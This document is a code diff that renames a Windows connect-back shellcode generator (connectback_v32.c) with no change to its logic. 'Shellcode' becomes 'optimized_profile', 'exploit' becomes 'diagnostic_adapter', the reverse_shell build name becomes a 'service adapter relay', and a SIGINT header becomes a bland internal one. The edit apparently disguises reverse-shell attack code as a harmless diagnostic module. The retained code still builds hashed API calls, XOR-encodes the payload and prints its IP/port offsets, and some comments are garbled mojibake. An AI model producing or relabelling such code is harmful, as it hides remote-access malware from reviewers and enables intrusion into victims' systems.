@@ -1,14 +1,14 @@
 #
-# 🛡️ C4ISR-STRATCOM: SIGINT-V5
-# [CLASSIFIED]: CONFIDENCIAL
-# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
-# [TACTIC]: TA0011_Command_Control
-# [TECHNIQUE]: T1095_Non_Application_Layer_Protocol
+# 🛡️ HCG-SYSARCH: SAM-V5
+# [RESTRICTED]: USO_INTERNO
+# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
+# [MODULO]: TA0011_Command_Control
+# [COMPONENTE]: T1095_Non_Application_Layer_Protocol
 #
 /*
 *-----------------------------------------------------------------------
 *
-* connectback_v32.c - Connect Back shellcode for Overflow exploit
+* connectback_v32.c - Connect Back optimized_profile for Overflow diagnostic_adapter
 *
 * Copyright (C) 2000-2004 HUC All Rights Reserved.
 *
@@ -34,10 +34,10 @@
 *          : 6. win2000/winxp/win2003 ÏÂ²âÊÔ³É¹¦¡£
 *          : 7. ÔÚÊ¹´úÂëÒ×ÓÚÐÞ¸ÄµÄÍ¬Ê±×î´óÓÅ»¯Îª´óÐ¡275 bytes¡£
 *          :
-* Complie  : cl sigv5_t1095_reverse_shell_win32.c
+* Complie  : cl sigv5_t1095_remote_service_adapter_relay_win32.c
 *          :
 * Reference: http://www.lsd-pl.net/documents/winasm-1.0.1.pdf
-*          : http://www.metasploit.com/shellcode.html
+*          : http://www.metasploit.com/optimized_profile.html
 *
 *------------------------------------------------------------------------
 */
@@ -96,10 +96,10 @@ unsigned char functions[100][128] =
     {""},
 };
 
-// Shellcode string
+// Optimized_Profile string
 unsigned char  sc[1024] = {0};
 
-// ASM shellcode main function
+// ASM optimized_profile main function
 void    ShellCode();
 
 // Get function hash
@@ -116,7 +116,7 @@ static DWORD __stdcall GetHash ( char *c )
     return( h );
 }
 
-// Print Shellcode
+// Print Optimized_Profile
 void PrintSc(unsigned char *sc, int len)
 {
     int    i,j;
@@ -125,7 +125,7 @@ void PrintSc(unsigned char *sc, int len)
 
     //printf("/* %d bytes */\n", buffsize);
 
-    // Print general shellcode
+    // Print general optimized_profile
     for(i = 0; i < len; i++)
     {
         if((i%16)==0)
@@ -176,7 +176,7 @@ void Make_ShellCode()
     dwHashSize = i*4;
 
 
-    // Deal with shellcode
+    // Deal with optimized_profile
     pSc_addr = (unsigned char *)ShellCode;
 
     for (k=0;k<MAX_SC_LEN;++k )
@@ -196,7 +196,7 @@ void Make_ShellCode()
     }
     Sc_len=k;                               // Length of the ShellCode
 
-    memcpy(sc, pSc_addr, Sc_len);           // Copy shellcode to sc[]
+    memcpy(sc, pSc_addr, Sc_len);           // Copy optimized_profile to sc[]
 
 
     // Add functions hash
@@ -204,8 +204,8 @@ void Make_ShellCode()
     Sc_len += dwHashSize;
 
 
-    // Print the size of shellcode.
-    printf("[+] %d + %d = %d bytes shellcode\n", Sc_len-DECODE_LEN, DECODE_LEN, Sc_len);
+    // Print the size of optimized_profile.
+    printf("[+] %d + %d = %d bytes optimized_profile\n", Sc_len-DECODE_LEN, DECODE_LEN, Sc_len);
 
     // Print the ip/port offset
     for(k=0; k <= Sc_len-3; ++k)
@@ -223,7 +223,7 @@ void Make_ShellCode()
     }
 */
 
-    // Print shellcode
+    // Print optimized_profile
     //PrintSc(sc, Sc_len);
 
 
@@ -278,8 +278,8 @@ void Make_ShellCode()
     printf("/* %d bytes decode */\r\n", DECODE_LEN);
     PrintSc(sc, DECODE_LEN);
 
-    // Print shellcode
-    printf("/* %d bytes shellcode, xor with 0x%02x */\r\n", Sc_len-DECODE_LEN, Enc_key);
+    // Print optimized_profile
+    printf("/* %d bytes optimized_profile, xor with 0x%02x */\r\n", Sc_len-DECODE_LEN, Enc_key);
     PrintSc((char*)sc+DECODE_LEN, Sc_len-DECODE_LEN);
 }
 
